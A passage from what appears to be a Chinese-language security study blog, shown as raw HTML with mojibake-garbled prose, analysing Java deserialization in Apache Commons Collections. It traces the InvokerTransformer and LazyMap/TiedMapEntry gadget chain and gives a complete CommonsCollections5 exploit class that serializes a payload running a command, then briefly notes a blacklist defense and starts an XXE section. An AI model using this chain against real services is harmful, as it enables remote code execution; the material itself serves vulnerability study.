class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åˆ°è¿™ä¸€æ­¥å·²ç»èƒ½çœ‹å‡ºæˆ‘ä»¬æ„é€ å‡½æ•°çš„å‚æ•°å·²ç»æ§åˆ¶InvokerTransformeråå°„çš„å‚æ•°äº†ã€‚è¾¾æˆå‘½ä»¤æ‰§è¡Œã€‚<br>gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TransformedMap.put()</span><br><span class="line">    &#x3D;&gt;TransformedMap.transformKey()</span><br><span class="line">        &#x3D;&gt;ChainedTransformer.transform()</span><br><span class="line">           &#x3D;&gt;ConstantTransformer.transform()</span><br><span class="line">              &#x3D;&gt;InvokerTransformer.transform()</span><br><span class="line">                    &#x3D;&gt;Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">              &#x3D;&gt;InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">              &#x3D;&gt;InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>Map.Entryçš„pocæˆ‘å°±ä¸è·Ÿäº†ã€‚åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„æœºç†ã€‚</p><p>æ¥ä¸‹æ¥ä¹Ÿå°±æ˜¯CommonCollectionsçš„gadgetäº†ã€‚ä¸Šé¢æˆ‘ä»¬çŸ¥é“,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Mapç±»çš„å¯¹è±¡è¿›è¡Œåå°„çš„payloadæ„é€ ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¶æ„ç±»çš„æˆå‘˜è‚¯å®šæ˜¯Mapç±»çš„ã€‚å¹¶ä¸”ç”±äºååºåˆ—åŒ–çš„è¦æ±‚,è¿™ä¸ªç±»é‡å†™äº†readObject(),å¹¶ä¸”åœ¨readObject()ä¸­è°ƒç”¨äº†put()æˆ–è€…setValue()</p><p>åœ¨ä¸åŒjdkç‰ˆæœ¬ä¸­æˆ‘ä»¬èƒ½æ‰¾åˆ°çš„ç¬¦åˆè¦æ±‚çš„ç±»ä¸åŒã€‚ç›®å‰æ¯”è¾ƒæ–°çš„åº”è¯¥æ˜¯ç”¨BadAttributeValueExpException+TiedMapEntry+lazyMap+ChainedTransformerçš„é“¾å­<br>å…ˆæ¥çœ‹ä¸‹BadAttributeValueExpException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3105272988410493376L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span> A string representation of the attribute that originated this exception.</span></span><br><span class="line"><span class="comment">     * for example, the string value can be the return of &#123;<span class="doctag">@code</span> attribute.toString()&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a BadAttributeValueExpException using the specified Object to</span></span><br><span class="line"><span class="comment">     * create the toString() value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> val the inappropriate value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the string representing the object.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"BadAttributeValueException: "</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ä»BadAttributeValueExpExceptionç±»çš„readObejct()æ–¹æ³•çŸ¥é“,<code>val.toString()</code>æ˜¯æ•´ä¸ªreadObject()çš„é‡ç‚¹ã€‚ç°åœ¨éœ€è¦ä¸€ä¸ªç±»ï¼Œèƒ½åœ¨è°ƒç”¨toString()æ–¹æ³•æ—¶è§¦å‘transform()æ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„åå°„é“¾</p><p>æ‰¾åˆ°LazyMapçš„get()æ–¹æ³•ã€‚ä¸phpçš„é­”æœ¯æ–¹æ³•ä¸€æ ·,å¯ä»¥åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„keyæ—¶æ¥æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ç”Ÿæˆkey.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯TiedMapEntryç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.commons.collections.keyvalue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.KeyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot set value to this map entry"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.put(<span class="keyword">this</span>.key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Entry other = (Entry)obj;</span><br><span class="line">            Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">this</span>.key == <span class="keyword">null</span> ? other.getKey() == <span class="keyword">null</span> : <span class="keyword">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="keyword">null</span> ? other.getValue() == <span class="keyword">null</span> : value.equals(other.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒåœ¨è°ƒç”¨toString()æ—¶,å®é™…ä¸Šè°ƒç”¨äº†getValue()å³map.get(key)ã€‚è¿™æ ·å®ƒå°±ç¬¦åˆä¸Šé¢Lazymapçš„è¦æ±‚äº†ã€‚<br>é‚£ä¹ˆgadgetå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()<span class="comment">//å…¶valä¸ºTiedMapEntry</span></span><br><span class="line">  =&gt;TiedMapEntry.toString()=&gt;TiedMapEntry.getValue()<span class="comment">//å…¶mapå¯¹è±¡æ˜¯LazyMap</span></span><br><span class="line">    =&gt;LazyMap.get()<span class="comment">//å…¶factoryå¯¹è±¡æ˜¯ChainedTransformer</span></span><br><span class="line">      =&gt;ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„exp.ä¹Ÿæ˜¯cc5çš„é“¾å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"1"</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo233"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException exception = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valField = exception.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(exception, entry);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(exception);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"poc"</span>));</span><br><span class="line">        in.readObject();  <span class="comment">// è§¦å‘æ¼æ´</span></span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>done.</p><ul><li>é˜²å¾¡æœºåˆ¶</li></ul><p>ä»demoçš„å®‰å…¨ä»£ç éƒ¨åˆ†å°±èƒ½çœ‹å‡ºã€‚ä½¿ç”¨äº†AntObjectInputStreamä¸InvalidClassExceptionæ¥è¿›è¡Œé»‘/ç™½åå•çš„é˜²èŒƒã€‚å…·ä½“å¯ä»¥çœ‹å…¶è‡ªå®šä¹‰çš„ä»£ç  <a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java</a><br>ç›´æ¥Hook java/io/ObjectInputStreamç±»çš„resolveClassæ–¹æ³•</p><p>//ä»Šå¤©å…ˆå†™è¿™ä¹ˆå¤šå§,å¥½ä¹…æ²¡å†™javaå†™èµ·æ¥è¿˜æŒºæ€€å¿µçš„ã€‚</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>XXEåœ¨java-sec-codeé¡¹ç›®ä¸­è¢«åˆ†ä¸ºäº†ä¸¤ä¸ªéƒ¨åˆ†ã€‚æ™®é€šXXEä¸POI ooxml XXE.æˆ‘ä»¬å…ˆä»åŸºç¡€çš„çœ‹èµ·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span 